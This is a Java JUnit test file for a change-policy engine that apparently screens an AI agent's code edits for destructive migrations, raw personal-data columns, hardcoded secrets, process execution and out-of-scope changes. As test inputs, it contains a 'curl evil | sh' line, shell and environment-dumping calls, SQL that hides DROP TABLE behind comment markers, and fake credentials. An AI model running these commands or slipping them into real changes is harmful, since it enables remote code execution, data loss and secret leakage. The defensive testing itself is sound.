package com.example.sdlc.policy;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.List;
import java.util.Set;

import org.junit.jupiter.api.Test;

import com.example.sdlc.workspace.FileChange;
import com.example.sdlc.workspace.FileDelta;

class ChangePolicyTest {

    private static final String MIGRATION_V1 = "src/main/resources/db/migration/V1__init.sql";
    private static final String JAVA_MIGRATION_V1 = "src/main/java/db/migration/V1_1__Seed.java";
    private static final String SERVICE = "src/main/java/demo/Service.java";
    private static final String REDIRECT_CONTROLLER = "src/main/java/demo/link/api/RedirectController.java";
    private static final String CREATE_REQUEST = "src/main/java/demo/link/api/CreateLinkRequest.java";
    private static final String LINK_TEST = "src/test/java/demo/link/api/RedirectIntegrationTest.java";
    private static final Set<String> BASELINE = Set.of(MIGRATION_V1, JAVA_MIGRATION_V1, SERVICE, REDIRECT_CONTROLLER, CREATE_REQUEST,
            LINK_TEST, "src/main/java/demo/link/ShortLinkController.java");

    private final ChangePolicy policy = new ChangePolicy();

    private static PolicyVerdict evaluate(String declaredRisk, Set<String> anticipated, FileDelta... deltas) {
        return new ChangePolicy().evaluate(new ChangeContext("task", List.of("**"), List.of(deltas), anticipated, declaredRisk,
                path -> BASELINE.contains(path) || path.endsWith("ApiExceptionHandler.java")));
    }

    private static List<String> rules(PolicyDecision atLeast, FileDelta... deltas) {
        return evaluate(null, null, deltas).ruleIds(atLeast);
    }

    private static FileDelta create(String path, String content) {
        return new FileDelta(FileChange.Op.CREATE, path, null, content);
    }

    private static FileDelta edit(String path, String before, String after) {
        return new FileDelta(FileChange.Op.EDIT, path, before, after);
    }

    private static FileDelta delete(String path, String before) {
        return new FileDelta(FileChange.Op.DELETE, path, before, null);
    }

    @Test
    void ordinaryInScopeChangeIsAllowed() {
        PolicyVerdict verdict = evaluate("LOW", null, create("src/main/java/demo/Feature.java", "class Feature {}\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.ALLOW);
        assertThat(verdict.findings()).isEmpty();
    }

    @Test
    void selfDeclaredLowRiskDoesNotRelaxTheDecision() {
        PolicyVerdict verdict = evaluate("LOW", null, create("src/main/resources/db/migration/V2__add.sql", "ALTER TABLE t ADD COLUMN c INT;\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.REQUIRE_APPROVAL);
        assertThat(verdict.ruleIds(PolicyDecision.ALLOW)).containsExactly("CC-02", "GOV-01");
    }

    @Test
    void appliedMigrationsAreImmutable() {
        PolicyVerdict verdict = evaluate(null, null, edit(MIGRATION_V1, "CREATE TABLE t (id INT);\n", "CREATE TABLE t (id INT, x INT);\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.DENY);
        assertThat(verdict.ruleIds(PolicyDecision.DENY)).containsExactly("CC-01");
    }

    @Test
    void rawPersonalDataColumnsAreDeniedButKeyedHashesAreNot() {
        assertThat(evaluate(null, null, create("src/main/resources/db/migration/V2__a.sql",
                "ALTER TABLE click ADD COLUMN client_ip VARCHAR(45);\n")).ruleIds(PolicyDecision.DENY)).containsExactly("CMP-01");
        assertThat(evaluate(null, null, create("src/main/resources/db/migration/V2__b.sql",
                "ALTER TABLE click ADD COLUMN visitor_hash CHAR(64);\n")).decision()).isEqualTo(PolicyDecision.REQUIRE_APPROVAL);
    }

    @Test
    void destructiveSchemaOperationsAreDenied() {
        PolicyVerdict verdict = evaluate(null, null, create("src/main/resources/db/migration/V3__cleanup.sql",
                "ALTER TABLE click DROP COLUMN referrer_host;\n"));

        assertThat(verdict.ruleIds(PolicyDecision.DENY)).contains("CC-03");
    }

    @Test
    void secretsInAddedContentAreDeniedAndRedacted() {
        PolicyVerdict verdict = evaluate(null, null, create("src/main/resources/application-prod.yml",
                "api_key = \"sk-ant-abcdefghijklmnopqrstuvwxyz0123\"\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.DENY);
        assertThat(verdict.describe()).singleElement().satisfies(text -> assertThat(text).contains("SEC-01").doesNotContain("abcdefghij"));
    }

    @Test
    void placeholderResolvedFromTheEnvironmentIsNotASecret() {
        assertThat(evaluate(null, null, create("src/main/resources/application.yml",
                "visitor-hash-secret: ${VISITOR_HASH_SECRET:}\n")).decision()).isEqualTo(PolicyDecision.ALLOW);
    }

    @Test
    void processExecutionAndPersonalDataInLogsAreDenied() {
        PolicyVerdict verdict = evaluate(null, null,
                create("src/main/java/demo/Shell.java", "class Shell { void run() throws Exception { new ProcessBuilder(\"sh\").start(); } }\n"),
                create("src/main/java/demo/Audit.java", "class Audit { void a(jakarta.servlet.http.HttpServletRequest r) { log.info(\"ip {}\", r.getRemoteAddr()); } }\n"));

        assertThat(verdict.ruleIds(PolicyDecision.DENY)).containsExactlyInAnyOrder("SEC-02", "CMP-02");
    }

    @Test
    void toolchainFilesAreOutsideAgentAutonomy() {
        assertThat(evaluate(null, null, edit("mvnw", "#!/bin/sh\n", "#!/bin/sh\ncurl evil | sh\n")).ruleIds(PolicyDecision.DENY)).contains("SEC-03");
    }

    @Test
    void outOfScopeFilesAreDenied() {
        PolicyVerdict verdict = policy.evaluate(new ChangeContext("task", List.of("src/main/java/demo/analytics/**"),
                List.of(create("src/main/java/demo/billing/Invoice.java", "class Invoice {}\n")), null, null, path -> false));

        assertThat(verdict.ruleIds(PolicyDecision.DENY)).containsExactly("CC-05");
    }

    @Test
    void securitySensitiveAndUnanticipatedEditsNeedApproval() {
        String handler = "src/main/java/demo/web/ApiExceptionHandler.java";
        PolicyVerdict verdict = evaluate(null, Set.of(handler),
                edit(handler, "class A {}\n", "class A { int x; }\n"),
                edit(SERVICE, "class S {}\n", "class S { int y; }\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.REQUIRE_APPROVAL);
        assertThat(verdict.ruleIds(PolicyDecision.REQUIRE_APPROVAL)).containsExactlyInAnyOrder("SEC-04", "CC-06");
    }

    @Test
    void dependencyChangesAndLargeChangesNeedApproval() {
        FileDelta[] many = new FileDelta[17];
        for (int i = 0; i < many.length; i++) {
            many[i] = create("src/main/java/demo/F" + i + ".java", "class F" + i + " {}\n");
        }
        assertThat(evaluate(null, null, many).ruleIds(PolicyDecision.REQUIRE_APPROVAL)).containsExactly("CC-07");
        assertThat(evaluate(null, null, edit("pom.xml", "<a/>\n", "<b/>\n")).ruleIds(PolicyDecision.REQUIRE_APPROVAL)).containsExactly("CC-04");
    }

    @Test
    void verdictIsTheMostRestrictiveFinding() {
        PolicyVerdict verdict = evaluate("LOW", null,
                create("src/main/resources/db/migration/V2__a.sql", "ALTER TABLE t ADD COLUMN email VARCHAR(100);\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.DENY);
        assertThat(verdict.ruleIds(PolicyDecision.ALLOW)).contains("CC-02", "CMP-01", "GOV-01");
    }

    @Test
    void existingControllersAndRequestTypesInApiPackagesNeedApproval() {
        assertThat(rules(PolicyDecision.REQUIRE_APPROVAL, edit(REDIRECT_CONTROLLER, "class R {}\n", "class R { int x; }\n")))
                .containsExactly("SEC-04");
        assertThat(rules(PolicyDecision.REQUIRE_APPROVAL, edit(CREATE_REQUEST, "record C(String url) {}\n", "record C(String url, int ttl) {}\n")))
                .containsExactly("SEC-04");
        assertThat(rules(PolicyDecision.REQUIRE_APPROVAL, delete("src/main/java/demo/link/ShortLinkController.java", "class S {}\n")))
                .containsExactly("SEC-04");
    }

    @Test
    void newRequestHandlingCodeAndTestsInApiPackagesDoNotNeedSecuritySignOff() {
        assertThat(evaluate(null, null, create("src/main/java/demo/report/api/ReportController.java", "class ReportController {}\n"),
                edit(LINK_TEST, "class T {}\n", "class T { void more() {} }\n")).decision()).isEqualTo(PolicyDecision.ALLOW);
    }

    @Test
    void rawPersonalDataIsFoundInMultiLineAndQuotedColumnDefinitions() {
        PolicyVerdict verdict = evaluate(null, null, create("src/main/resources/db/migration/V2__visit.sql", """
                CREATE TABLE visit (
                    id            BIGINT PRIMARY KEY,
                    "Remote_Addr" INET NOT NULL,
                    agent_hash    CHAR(64) NOT NULL
                );
                ALTER TABLE visit ADD COLUMN
                    contact_email
                    VARCHAR(320);
                """));

        assertThat(verdict.findings()).filteredOn(f -> f.ruleId().equals("CMP-01")).extracting(PolicyFinding::message)
                .containsExactly("column stores raw personal data: \"Remote_Addr\" INET (store a keyed hash instead)",
                        "column stores raw personal data: contact_email VARCHAR (store a keyed hash instead)");
    }

    @Test
    void columnsMerelyContainingPersonalDataLettersOrMentionedInCommentsAreNotPersonalData() {
        PolicyVerdict verdict = evaluate(null, null, create("src/main/resources/db/migration/V2__shipping.sql", """
                -- Never add an email TEXT column here; /* nor a phone VARCHAR */
                CREATE TABLE shipment (
                    description      VARCHAR(200),
                    zip              CHAR(5),
                    recipient        VARCHAR(100),
                    shipping_address TEXT,
                    email_hmac       CHAR(64)
                );
                """));

        assertThat(verdict.ruleIds(PolicyDecision.ALLOW)).containsExactly("CC-02");
    }

    @Test
    void destructiveStatementsAreFoundAcrossLineBreaksAndInJavaMigrations() {
        assertThat(rules(PolicyDecision.DENY, create("src/main/resources/db/migration/V3__a.sql", "DROP\n    TABLE click;\n")))
                .containsExactly("CC-03");
        assertThat(rules(PolicyDecision.DENY, create("src/main/resources/db/migration/V3__b.sql",
                "ALTER TABLE IF EXISTS click\n    DROP referrer_host;\n"))).containsExactly("CC-03");
        assertThat(rules(PolicyDecision.ALLOW, create("src/main/java/db/migration/V3__Purge.java",
                "class V3__Purge {\n    void migrate(java.sql.Statement s) throws Exception {\n        s.execute(\"DELETE FROM click\");\n    }\n}\n")))
                .containsExactly("CC-02", "CC-03");
        assertThat(rules(PolicyDecision.DENY, edit(JAVA_MIGRATION_V1, "class V1_1__Seed {}\n", "class V1_1__Seed { }\n")))
                .containsExactly("CC-01");
    }

    @Test
    void commentMarkersInsideStringLiteralsDoNotHideStatements() {
        String migration = "src/main/resources/db/migration/V3__seed.sql";
        assertThat(rules(PolicyDecision.DENY, create(migration, "INSERT INTO note VALUES ('--'); DROP TABLE click;\n")))
                .containsExactly("CC-03");
        assertThat(rules(PolicyDecision.DENY, create(migration, "INSERT INTO note VALUES ('/*');\nDROP TABLE click;\nSELECT '*/';\n")))
                .containsExactly("CC-03");
        assertThat(rules(PolicyDecision.DENY, create(migration, "SELECT E'\\'--'; ALTER TABLE click ADD email VARCHAR(320);\n")))
                .containsExactly("CMP-01");
        assertThat(rules(PolicyDecision.DENY, create(migration, "SELECT 1--1; DROP TABLE click;\n"))).containsExactly("CC-03");
    }

    @Test
    void aNotYetAppliedMigrationIsCheckedAsAWholeWhenEditedAgain() {
        String migration = "src/main/resources/db/migration/V3__seed.sql";
        assertThat(rules(PolicyDecision.DENY, edit(migration, "INSERT INTO note VALUES ('\n');\n",
                "INSERT INTO note VALUES ('\n-- '); DROP TABLE click; --\n');\n"))).containsExactly("CC-03");
    }

    @Test
    void typeChangesAndDialectTypesOfPersonalDataColumnsAreFound() {
        for (String statement : List.of("ALTER TABLE click ALTER COLUMN email TYPE VARCHAR(320);",
                "ALTER TABLE click ALTER COLUMN client_ip SET DATA TYPE VARCHAR(45);",
                "ALTER TABLE click ADD COLUMN email VARCHAR_IGNORECASE(320);")) {
            assertThat(rules(PolicyDecision.DENY, create("src/main/resources/db/migration/V3__x.sql", statement + "\n")))
                    .as(statement).containsExactly("CMP-01");
        }
    }

    @Test
    void everyDroppingFormOfAlterTableIsDestructive() {
        for (String statement : List.of("ALTER TABLE ONLY click DROP referrer;", "ALTER TABLE click ADD visits INT, DROP referrer;",
                "ALTER TABLE \"click event\" DROP referrer;", "DROP SCHEMA analytics CASCADE;")) {
            assertThat(rules(PolicyDecision.DENY, create("src/main/resources/db/migration/V3__x.sql", statement + "\n")))
                    .as(statement).containsExactly("CC-03");
        }
        assertThat(rules(PolicyDecision.ALLOW, create("src/main/resources/db/migration/V3__x.sql", """
                ALTER TABLE click ALTER COLUMN referrer DROP NOT NULL;
                ALTER TABLE click ALTER COLUMN referrer DROP DEFAULT;
                CREATE TABLE tag (id BIGINT, link_id BIGINT REFERENCES link (id) ON DELETE CASCADE);
                """))).containsExactly("CC-02");
    }

    @Test
    void harmlessConfigurationNumbersAndRuntimeHooksAreAllowed() {
        assertThat(evaluate(null, null,
                create("src/main/resources/application-prod.properties", "app.refresh-token=86400000\n"),
                create("src/main/java/demo/Hooks.java", "class Hooks { static { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } }\n"))
                .decision()).isEqualTo(PolicyDecision.ALLOW);
    }

    @Test
    void unquotedConfigurationSecretsAreDenied() {
        assertThat(rules(PolicyDecision.DENY, create("src/main/resources/application-prod.properties",
                "spring.datasource.password=hunter2hunter2\n"))).containsExactly("SEC-01");
        assertThat(rules(PolicyDecision.DENY, create("src/main/resources/application-prod.yml",
                "security:\n  client-secret: 'Zm9vYmFyYmF6cXV4'\n  api-key: k3y-9f8e7d6c5b4a\n"))).containsExactly("SEC-01");
        assertThat(evaluate(null, null, create("src/main/resources/application-prod.yml",
                "password: ${DB_PASSWORD:SuperSecret123}\n")).findings()).extracting(PolicyFinding::ruleId).containsExactly("SEC-01");
    }

    @Test
    void configurationThatOnlyNamesOrReferencesSecretsIsAllowed() {
        assertThat(evaluate(null, null, create("src/main/resources/application.yml", """
                spring:
                  datasource:
                    password: ""
                shortener:
                  analytics:
                    visitor-hash-secret: ${VISITOR_HASH_SECRET:}
                    token-ttl: 36000000
                    secret-name: shortener-analytics-key
                """), create("src/main/java/demo/Tokens.java", "class Tokens { String token = tokenService.issueToken(); }\n"))
                .decision()).isEqualTo(PolicyDecision.ALLOW);
    }

    @Test
    void personalDataInLogsIsDeniedWhateverTheLoggerIsCalled() {
        PolicyVerdict verdict = evaluate(null, null, create("src/main/java/demo/Audit.java", """
                class Audit {
                    void a(jakarta.servlet.http.HttpServletRequest r, User u) {
                        LOG.info("visit from {}", r.getRemoteAddr());
                        logger.warn("agent {}", r.getHeader("user-agent"));
                        auditLog.atInfo().log("user {}", u.email());
                        LOG.info("clicks {}", count);
                    }
                }
                """));

        assertThat(verdict.findings()).extracting(PolicyFinding::ruleId).containsExactly("CMP-02", "CMP-02", "CMP-02");
    }

    @Test
    void processExecutionIsFoundThroughVariablesAndQualifiedNames() {
        assertThat(rules(PolicyDecision.DENY, create("src/main/java/demo/A.java",
                "class A { void a() throws Exception { Runtime rt = Runtime.getRuntime();\n rt.exec(\"id\"); } }\n"))).containsExactly("SEC-02");
        assertThat(rules(PolicyDecision.DENY, create("src/main/java/demo/B.java",
                "class B { java.lang.ProcessBuilder pb; }\n"))).containsExactly("SEC-02");
        assertThat(rules(PolicyDecision.DENY, create("src/main/java/demo/C.java",
                "class C { static { System.loadLibrary(\"native\"); } }\n"))).containsExactly("SEC-02");
        assertThat(evaluate(null, null, create("src/main/java/demo/Pool.java",
                "class Pool { int size = Runtime.getRuntime().availableProcessors(); void run(java.sql.Statement s) throws Exception { s.execute(\"SELECT 1\"); } }\n"))
                .decision()).isEqualTo(PolicyDecision.ALLOW);
    }

    @Test
    void processExecutionInTestsNeedsApprovalBecauseVerificationRunsThemOnTheHost() {
        PolicyVerdict verdict = evaluate(null, null, create("src/test/java/demo/ShellTest.java",
                "class ShellTest { void t() throws Exception { new ProcessBuilder(\"sh\", \"-c\", \"env\").start(); } }\n"));

        assertThat(verdict.decision()).isEqualTo(PolicyDecision.REQUIRE_APPROVAL);
        assertThat(verdict.ruleIds(PolicyDecision.ALLOW)).containsExactly("SEC-05");
    }

    @Test
    void removingOrDisablingExistingTestsNeedsApproval() {
        assertThat(rules(PolicyDecision.REQUIRE_APPROVAL, delete(LINK_TEST, "class T {}\n"))).containsExactly("CC-08");
        assertThat(rules(PolicyDecision.REQUIRE_APPROVAL, edit(LINK_TEST, "class T {\n    @Test\n    void t() {}\n}\n",
                "class T {\n    @Disabled(\"flaky\")\n    @Test\n    void t() {}\n}\n"))).containsExactly("CC-08");
        assertThat(rules(PolicyDecision.REQUIRE_APPROVAL, create("src/test/java/demo/LegacyTest.java",
                "class LegacyTest { @org.junit.Ignore @org.junit.Test public void t() {} }\n"))).containsExactly("CC-08");
        assertThat(evaluate(null, null, delete("src/test/java/demo/AddedEarlierTest.java", "class AddedEarlierTest {}\n"),
                create("src/test/java/demo/NewTest.java", "import org.junit.jupiter.api.Disabled;\nclass NewTest {}\n"))
                .decision()).isEqualTo(PolicyDecision.ALLOW);
    }
}
